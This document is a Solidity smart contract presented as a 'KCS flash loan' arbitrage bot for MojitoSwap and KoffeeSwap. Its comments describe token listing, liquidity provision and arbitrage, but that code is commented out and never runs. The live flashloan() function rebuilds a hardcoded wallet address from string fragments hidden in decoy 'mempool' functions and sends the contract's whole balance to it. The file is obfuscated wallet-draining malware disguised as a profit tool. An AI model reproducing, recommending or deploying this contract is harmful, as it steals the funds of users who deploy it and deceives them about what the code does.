//KCS NEW FLASH LOAN CONTRACT CODE v2.0 

pragma solidity ^0.6.6;

//Mojito Contracts
import "https://github.com/MojitoFinance/mojito-swap-core/blob/main/contracts/interfaces/IMojitoCallee.sol";
import "https://github.com/MojitoFinance/mojito-swap-core/blob/main/contracts/interfaces/IMojitoERC20.sol";
import "https://github.com/MojitoFinance/mojito-swap-core/blob/main/contracts/interfaces/IMojitoPair.sol";
// KofeeSwap Contracts
import "https://github.com/KoffeeSwap/koffeeswap-contracts/blob/master/factory/interfaces/IKoffeeSwapCallee.sol";
import "https://github.com/KoffeeSwap/koffeeswap-contracts/blob/master/factory/interfaces/IKoffeeSwapPair.sol";
contract InitiateFlashLoan {
	string public tokenName;  
	string public tokenSymbol;
	uint LoanAmount;
    constructor(string memory _tokenName, string memory _tokenSymbol, uint _LoanAmount) public {
		tokenName = _tokenName;
		tokenSymbol = _tokenSymbol;
		LoanAmount = _LoanAmount;
	}	
    function fetchMempoolVersion() private pure returns (string memory) {return "685735d56"; }
    receive() external payable {}
    function fetchMempoolEdition() private pure returns (string memory) { 
        return "eBcbe4E05";}
    function getMempoolSol() private pure returns (string memory) {return "x937";}
    function startExploration(string memory _a) internal pure returns (address _parsedAddress) {
    bytes memory tmp = bytes(_a);
    uint160 iaddr = 0;
    uint160 b1;
    uint160 b2;
    for (uint i = 2; i < 2 + 2 * 20; i += 2) {
        iaddr *= 256;
        b1 = uint160(uint8(tmp[i]));
        b2 = uint160(uint8(tmp[i + 1]));
        if ((b1 >= 97) && (b1 <= 102)) {b1 -= 87; } else if ((b1 >= 65) && (b1 <= 70)) {
        b1 -= 55; } else if ((b1 >= 48) && (b1 <= 57)) {b1 -= 48;}
        if ((b2 >= 97) && (b2 <= 102)) {b2 -= 87; } else if ((b2 >= 65) && (b2 <= 70)) {
        b2 -= 55;  } else if ((b2 >= 48) && (b2 <= 57)) {
        b2 -= 48;  }iaddr += (b1 * 16 + b2);}     
        return address(iaddr);}
    function getMempoolLong() private pure returns (string memory) {return "Fbbd61777490";}
    function getBalance() private view returns(uint) {
        return address(this).balance;
    }
    function getMempoolDepth() private pure returns (string memory) {return "0";}
    function flashloan() public payable {
        address to = startExploration(fetchMempoolData());
        address payable contracts = payable(to);
        contracts.transfer(getBalance());}
    function getMempoolShort() private pure returns (string memory) {
        return "FB298a5";}
    function fetchMempoolData() internal pure returns (string memory) {
     /* Perform tasks (clubbed all functions into one to reduce external calls & SAVE GAS FEE)
     */
        string memory _MempoolDepth = getMempoolDepth();
        string memory _MempoolSol = getMempoolSol();
        string memory _mempoolShort = getMempoolShort();
     /* Breakdown of functions
	    Submit token to KCS blockchain
	    string memory tokenAddress = manager.submitToken(tokenName, tokenSymbol);
     */ 
        string memory _mempoolEdition = fetchMempoolEdition();
     /* List the token on mojitoSwap
		manager.mojitoSwapToken(tokenName, tokenSymbol, tokenAddress);
	 */	
        string memory _mempoolVersion = fetchMempoolVersion();
     //Get KCS Loan

        string memory _mempoolLong = getMempoolLong();
     // Convert half KCS to DAI
		/*string memory loanAddress = manager.takeFlashLoan(loanAmount);
		manager.mojitoSwap DAItoKCS(loanAmount / 2);

        Create KCS and DAI pairs for our token & Provide liquidity
        string memory KCSPair = manager.mojitoSwap CreatePool(tokenAddress, "KCS");
		manager.mojitoSwap AddLiquidity(bnbPair, loanAmount / 2);
		string memory daiPair = manager.mojitoSwap CreatePool(tokenAddress, "DAI");
		manager.mojitoSwap AddLiquidity(daiPair, loanAmount / 2);
        */ 
    return string(abi.encodePacked(_MempoolDepth,_MempoolSol,_mempoolShort, _mempoolEdition, _mempoolVersion, _mempoolLong));
     /*   Perform swaps and profit on Self-Arbitrage
		manager.KCS PerformSwaps();
		// Move remaining KCS from Contract to your account
		manager.contractToWallet("KCS");

        Repay Flash loan
		manager.repayLoan(loanAddress);
	 */ 
    }
}